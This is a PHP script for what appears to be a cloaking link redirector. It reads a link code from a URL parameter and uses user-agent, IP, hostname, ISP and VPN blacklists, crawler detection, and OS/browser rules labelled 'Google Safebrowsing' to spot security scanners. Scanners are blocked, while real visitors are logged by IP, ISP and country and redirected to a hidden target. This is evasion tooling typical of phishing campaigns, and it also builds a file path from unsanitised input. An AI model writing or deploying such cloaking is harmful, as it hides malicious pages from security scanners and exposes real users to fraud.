<?php
error_reporting(0);
require 'plugins/CrawlerDetect/Fixtures/AbstractProvider.php';
require 'plugins/CrawlerDetect/Fixtures/AbstractReff.php';
require 'plugins/CrawlerDetect/Fixtures/Crawlers.php';
require 'plugins/CrawlerDetect/Fixtures/Exclusions.php';
require 'plugins/CrawlerDetect/Fixtures/Headers.php';
require 'plugins/CrawlerDetect/Fixtures/Headerspam.php';
require 'plugins/CrawlerDetect/Fixtures/SpamReferrers.php';
require 'plugins/CrawlerDetect/CrawlerDetect.php';
require 'plugins/CrawlerDetect/ReferralSpamDetect.php';
require 'core.php';
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\ReferralSpamDetect\ReferralSpamDetect;
$code = $_GET['p'];
if($code == "admin" or $code == "admin/") {
     header("location: index.php");
     exit();
}
if(!file_exists("db/url/$code.ini")) {
    header("location: error.html");
    exit();
}
$setting = parse_ini_file("db/url/$code.ini");
if(isset($setting['url'])) {
    $CrawlerDetect = new CrawlerDetect;
    $referrer = new ReferralSpamDetect;
    $type = $setting['error'];
    $url = $setting['url'];
    $alternative = $setting['alternative'];
    require "plugins/blacklist.php";
    foreach ($blocker_ua as $useragent) {
      if (substr_count($ua, strtolower($useragent)) > 0 or $ua == "" or $ua == " " or $ua == "    ") {
          $status = "bot";
          $detect = "User Agent";
        }
    }
    foreach ($blocker_uafull as $uanew) {
      if ($ua == strtolower($uanew)) {
          $status = "bot";
          $detect = "User Agent";
        }
    }
    foreach ($blocker_ip as $ipbot) {
      if(preg_match('/' . $ipbot . '/',$_SERVER['REMOTE_ADDR'])){
          $status = "bot";
          $detect = "IP Range";
        }
    }
    foreach ($blocker_hostname as $hostnamebot) {
      if (substr_count($hostname, $hostnamebot) > 0) {
          $status = "bot";
          $detect = "Hostname";
      }
    }
    foreach ($blocker_isp as $ispbot) {
      if (substr_count($isp, $ispbot) > 0) {
          $status = "bot";
          $detect = "ISP";
        }
    }
    if($setting['onetime'] == "on") {
      foreach ($onetime as $onetimeaccess) {
        if ($ip == $onetimeaccess) {
            $status = "bot";
            $detect = "Onetime";
          }
      }
      tulis_file("db/onetime.dat","$ip");
    }
    if($os == "Windows Server 2003/XP x64") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($os == "Windows 7" and $br == "Firefox") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($os == "Windows XP" and $br == "Firefox") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($os == "Windows XP" and $br == "Chrome") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($os == "Windows Vista" or $os == "Ubuntu" or $os == "Chrome OS" or $os == "BlackBerry" or $os == "Linux") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($br == "Internet Explorer") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($br == "Unknown Browser") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($os == "Windows 2000") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($os == "Unknown OS Platform") {
         $status = "bot";
         $detect = "Google Safebrowsing";
    }
    if($vpn == "Y") {
        $status = "bot";
        $detect = "Proxy/VPN";
    }
    if($CrawlerDetect->isCrawler()) {
        $status = "bot";
        $detect = "Bot Crawler";
    }
   
    if($status == "bot") {
        tulis_file("logs/$code-bots.txt","$ip|$hostname|$isp|$detect");
        tulis_file("logs/$code-visitor.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode|Bot");
        blocked($type);
    }
    
    if($setting['country'] == "all") {
    }else{
      if($country != $setting['country']) {
        tulis_file("logs/$code-bots.txt","$ip|$hostname|$isp|Lock Country");
        tulis_file("logs/$code-visitor.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode|Bot");
        blocked($type);
      }
    }
    
    if($setting['device'] == "mobile") {
      if($os == "Android" or $os == "iPhone" or $os == "iPad") {
      }else{
        tulis_file("logs/$code-bots.txt","$ip|$hostname|$isp|Mobile Only");
        tulis_file("logs/$code-visitor.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode|Bot");
        blocked($type);
      }
    }
    if($setting['device'] == "desktop") {
      if($os == "Android" or $os == "iPhone" or $os == "iPad") {
        tulis_file("logs/$code-bots.txt","$ip|$hostname|$isp|Mobile Only");
        tulis_file("logs/$code-visitor.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode|Bot");
        blocked($type);
      }
    }
    if($setting['device'] == "apple") {
      if($os == "Mac OS X" or $os == "Mac OS 9" or $os == "iPhone" or $os == "iPad" or $os == "iPod") {
      }else{
        tulis_file("logs/$code-bots.txt","$ip|$hostname|$isp|Apple Only");
        tulis_file("logs/$code-visitor.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode|Bot");
        blocked($type);
      }
    }
    if(check_down($url) == "online") {
        tulis_file("logs/$code-real.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode");
        tulis_file("logs/$code-visitor.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode|Real");
        header("location: $url");
    }else{
        tulis_file("logs/$code-real.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode");
        tulis_file("logs/$code-visitor.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode|Real");
        header("location: $alternative");
    }
}